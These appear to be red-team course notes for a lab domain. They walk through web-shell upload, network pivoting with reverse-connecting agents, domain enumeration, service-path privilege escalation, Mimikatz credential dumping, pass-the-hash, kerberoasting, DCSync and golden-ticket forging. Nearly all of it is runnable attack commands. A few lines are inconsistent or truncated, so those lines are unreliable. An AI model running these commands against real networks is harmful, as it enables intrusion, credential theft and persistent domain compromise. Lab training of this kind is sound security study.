# Red Teaming

Attacker IP - 192.168.50.2(External)

Web Server - 192.168.50.3(Ext), 10.10.10.5(Int) Runs on two interfaces, 192.168.50.1 being external and 10.10.10.5 being internal.

Domain Controller(DC) 10.10.10.2

Application Server 10.10.10.4
```bash 
Curl can be used to connect to a web server
example:
curl --upload-file http://192.168.50.3/dav/shell.php - Uploads a shell.php file on the
server.

cadaver http://10.10.10.1/dav/ - This command is used to enter the /dav directory

put /usr/share/shell.php - PUT method is used to upload the shell.php file.
```

<h3>Network Pivoting</h3>

```bash
By default 192.168.50.3 is reachable from our machine, but we need to reach another 
internal network running on the victim's system. Let's assume the internal network subnet
is 192.168.98.0/24 and one of our target runs 192.168.98.30.

GOAL: Reach 192.168.98.0/24 network from our attacker machine with pivoting.

We have different ways of pivoting, first of which is using Proxychains with an active
ssh(with -D <proxy port> flag ) connection to the target.

NOTE: USE ANY OF THE PIVOTING TECHNIQUES BELOW IF ONE FAILS TO WORK
```
<h3>METHOD 1</h3>

```bash
First: edit proxychains config file and set  the following:
"socks4 8090, socks5 8090"
comment dns_leak.
Enable Dynamic Chain(and Disable the rest)

ssh -D 8090 msfadmin@192.168.50.3 (Opens up ssh connection via proxy port in proxychains)

second: proxychains nc -nv 192.168.98.30 80 (Runs proxychains with netcat to perform banner
grabbingon http port 80. This can also be used to test if a port is reachable(e.g 80)

proxychains rdesktop 192.168.98.30 - Using proxychains to maintain access to a windows system 
through Remote desktop protocol(RDP).

#Username and password found in metasploitable.(Optional)
```
<h3>METHOD 2: Using Rpivot.</h3>

```bash
We still need to leave our settings in /proxychains.conf as "socks4 8090, socks5 8090" 
as we would be making use of socks.

Download rpivot tool from the course materials.
change directory to rpivot( cd /rpivot)

Rpivot will run on the Attacker's machine, being the server, and the Victim also run 
rpivot as the client to connect back to the Server(Attacker's machine).

firstly, Copy rpivot tool to victim's machine, you can use any of your preferred methods, but
I'm cool with using scp -r rpivot/ privilege@192.168.50.3:/home/privilege/rpivot, since 
we have the password for ssh.

On attacker Machine, run:
- python2 server.py --server-ip <Ip address in Tun0 interface> --server-port 9980 
--proxy-ip 127.0.0.1 --proxy-ip 8090.

On Victim's machine, run:
- python2 client.py --server-ip <Attacker's IP address in Tun0 interface> --server-port 9980

We can test if it's reachable by running a simple nmap scan using
"proxychains nmap 192.168.98.30".
```

<h3>METHOD 3 Ligolo-ng</h3>

```bash
#Attacker Machine, download proxy & agent :
#Proxy
wget
https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_pr
oxy_0.4.3_Linux_64bit.tar.gz

#Agent
wget
https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_ag
ent_0.4.3_Linux_64bit.tar.gz

**Setup the ligolo-ng proxy in the attacker machine & ligolo-ng in the victim
machine.**

# Attacker Machine
sudo ip tuntap add user <your_user> mode tun ligolo - used to create a 
TUN (network tunnel) interface for Ligolo-ng’s agent to forward traffic through.

Delete the 192.168.98.0/24 IP Range from the tun0 interface:
sudo ip route del 192.168.98.0/24 dev tun0

#Up the ligolo interface :
sudo ip link set ligolo up (Don't worry if it still shows DOWN after turning it on,
it's waiting for a connection.

#Add 192.168.98.0/24 IP range to the ligolo interface :
sudo ip route add 192.168.98.0/24 dev ligolo

Confirm the route on your attacker machine. The internal IP range is now
added in the route.

Start the proxy on the attacker server
./proxy -selfcert -laddr 0.0.0.0:443

```

![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(238).png)


```jsx
Transfer the agent on the victim machine & start the connection
#Replace this with your attacker IP address.
./agent -connect 10.10.200.173:443 -ignore-cert
```
![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(239).png)


```jsx
On the server side, we can check that the agent connected successfully.

On the ligolo-ng proxy, check the session & start the tunnel.
session - To check active sessions
start - To start tunnel

Now, fire up a new terminal & check that we can now access the internal IP
range 192.168.98.0/24
```

![Diagram](https://raw.githubusercontent.com/Fernandez99fc/CRTA/refs/heads/main/Images/Screenshot_(241).png)

<h3>Red Teaming</h3>

```bash
Command to scan for open TCP ports on powershell.
1..1024 | % {echo ((new-object Net.Sockets.Tcpclient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
```

**Link**: [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/)

```bash
net user - Query local users present on the system
net user /domain - Query users present in a particular domain

POWERSHELL
Bypass powershell restriction to run powershell scripts using "powershell -ep bypass"
Import-Module <script.ps1> or . .\<script.ps1> to execute powershell script.

PowerView
Download Powerview which contains number of scripts to enumerate the domain e.g "Get-NetUser"
Get-NetUser - This can be ran on a compromised windows machine within the AD Environment
to get information about the user.

Get-NetUser | Select-Object givenname - To see information for only the variable givenname.
- givenname - Shows all users present in a domain.
Get-Domain -Verbose - Shows information about the domain
Get-DomainController- Gets information about the domain controller
Get-DomainSID -Verbose - Gets security identifier of the domains
Get-DomainSID -Domain labs.corp -Verbose - This gets the SID of the labs.corp domain.

Get-NetComputer -Verbose - List all computers in that domain
Get-NetGroup -Verbose - List all groups in the domain.
Get-NetGroup | Select-Object samaccountname - See all samaccountnames(groups) in that domain.
Get-NetGroupMember -Identity "Group name" -Verbose - To get all members in a particular domain group
Get-DomainTrust -Verbose  - Shows the trusted domains in a forest
Get-DomainTrust -Domain labs.corp -Verbose - Shows the trusted domains and forest of labs.corp
Find-LocalAdminAccess -Verbose - Finds a computer session where current user has local
admin access.

Invoke-ACLScanner -ResolveGUIDS -Verbose 
- Invoke-ACLScanner: Initiates an ACL scan. 
- ResolveGUIDS: Resolves GUIDs to readable names.
- Verbose: Displays detailed information during the execution.
```
## Local Privilege Escalation

```bash
**Powerup** can be used to escalate privileges locally within a windows environment.

When a **service** is created whose **executable path** contains ***spaces*** and isn’t enclosed within ***quotes***, leads to a vulnerability known as Unquoted Service Path which allows a user to gain **SYSTEM** privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).

```bash
Get-ModifiableService - To find misconfigured services a user or administrator can be 
running so as to exploit it and use it to gain higher level privilege.
Make use of the "Abusefunction" associated with the discovered service to exploit it.

Invoke-AllChecks -Verbose runs various security checks to identify potential 
vulnerabilities, misconfigurations, or weaknesses within the target system.

net localgroup "administrators" - Check list of users in the administrators group.
sc.exe qc "Service Name" -  Gives Information about this service.

Change binary Path of the service to a command that adds a local user to the administrator's
group with sc.exe config "Service Name" binpath="net localgroup administrators cyberwarfare\employee
 /add."
 
 Restart-Service "ServiceName" -Verbose. Next, check if youre a local admin


```

## Find WMILocalAdministrator.ps1

```bash

**Invoke-AllChecks -Verbose**  script runs several security checks, which might include things like finding clear-text passwords in memory, identifying weak or insecure configurations, testing for privilege escalation paths, and more.

## Credential Dumping

Download and run **Invoke-Mimikatz.ps1** in cmd to load scripts.

**Invoke-Mimikatz -DumpCreds -Verbose -** Dumps all credentials of domain and local users on the system. But you need admin privilege before you can run this commands./code

```bash
**Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash: 
/run:powershell.exe" - Used the hash of the admin user to execute the powershell command.**
```

## Find-WMILocalAdminAccess.ps1

```bash
This script can be ran to check if we have admin access to the domain controller or 
application server.
. . /Find-WMILocalAdminAccess
Then run Find-WMILocalAdminAccess -Verbose
```

## LATERAL MOVEMENT

**Poweshell Remoting** uses WinRM and runs on 5985(Http) and 5986(Https). Comes by default on windows server 2012. 

Adversaries use these ports to connect to remote servers and execute commands upon Higher privilege.

Configuration: “**Enable-PSRemoting -SkipNetworkProfileCheck -Verbose -Force**” as an administrator.

```powershell
After checking which user has admin privilege over the domain controller or application
server and we've opened a powershell session with the privilege. 
Next thing we can do is to open a session on the app-server.

$session = NewPSSession -ComputerName app-server -Verbose.
then run $session and the state should be opened

Invoke-Command -Session $session -ScriptBlock {whoami;ipconfig} -Verbose - This command 
executes the whoami and ipconfig command on the app-server session(other words, on the 
application server).

Enter-PSSession -Session $session -Verbose. - To enter the app-server through the session
Type whoami to confirm that we are now in the app-server as the emp_svc user.
Type hostname to see that we are in the APP-SERVER.

net user to see the local users on the app-server
klist to list all kerberos tickets.

Run Invoke-Mimikatz -ComputerName app-server -Verbose - To dump hashes on the app-server
And now we have the app-server hash.

One of the users there is app-svc. We can inspect each user with net user app-svc /domain
And app-svc is a member of domain admin group. Domain admin group holds the highest 
privilege in a domain.
```

## Exploitation

```powershell
On the app-server, we run Invoke-Mimikatz.ps1
run c 
/ntlm:hash /run:powershell.exe"' -Verbose.
Run . ./Powerview.ps1 script

Invoke-CheckLocalAdminAccess -ComputerName "DC-01.cyberwarfare.corp -Verbose - To check 
if the current or remote user has a local admin access on a machine(domain controller).

$sess = New-PSSession -ComputerName DC-01.cyberwarfare.corp -Verbose - Create new session 
on the domain controller.

Invoke-Command -Session $sess -ScriptBlock {ipconfig;whoami} -Verbose

Enter-PSSession -Session $sess -Verbose

Run whoami and we are now in the domain controller.


```

## Kerberoasting

```powershell
Kerberoating is simply extracting the Ntlm hash of the service account from the TGS and
bruteforcing it.
- Find User accounts used as a service account
Get-NetUser -SPN -Verbose

-Enumerate all SPNs on a domain
setspn -T cyberwarfare.corp -Q */*

- Request TGS aka service ticket  (Powerview.ps1)
Request-SPNTicket

#Check the services running

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
"HTTP/portal.cyberwarfare.corp"

- Check ticket in memory
klist

- Export ticket from memory using mimikatz:
Invoke-Mimikatz -Command '"kerberos::list /export"'

- Now Crack the service account password using tgsrepcrack.py
python.exe .\tgsrepcrack.py .\password.txt Ticket.CORP.Kirbi'
```

### Persistence

```powershell
Extract krbtgt account hash :
Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"' 

Domain SID :
whoami/all (of a domain user

Adversary Forge Golden ticket in a Domain as follows :
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp
/sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600
/renewmax:10080 /ptt"' 
```
